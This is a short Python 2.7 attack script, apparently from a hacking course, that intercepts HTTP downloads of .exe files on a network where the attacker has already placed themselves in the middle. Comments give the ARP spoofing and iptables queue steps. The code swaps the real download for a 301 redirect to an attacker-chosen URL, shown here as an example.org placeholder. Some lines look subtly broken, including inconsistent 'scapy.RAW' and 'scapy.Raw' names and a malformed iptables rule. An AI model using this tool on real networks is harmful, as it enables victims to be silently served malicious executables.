#!/usr/bin/env python

#File intercepter program python 2.7

#run ARP Spoof to get in the middle
#iptables -I OUTPUT -j NFQUEUE --queue-num 0 this creats a queue for the packets
#iptables -I OUTPUT -j INPUT --queue-num 0 this creats a queue for the packets for your own PC
#chage to -j FOWARD id you are attacking anohter computher
#iptables --flush when done
#run before using program

import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    # insert new code here to replace download
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    # do this anytime modfying pakcets
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.RAW): #RAW is the raw layer of the packet
        if scapy_packet[scapy.TCP].dport == 80: #port #80 is for http
            if ".exe" in scapy_packet[scapy.RAW].load:
                print("[+] exe Request ")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp\n\n")
                packet.set_payload(str(modified_packet))

    packet.accept() #fowards packet to target

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) #connects the queue in the program to the queue in the terminal
#The 0 is the set num for the que instance, process_packet is a callback funtion
queue.run()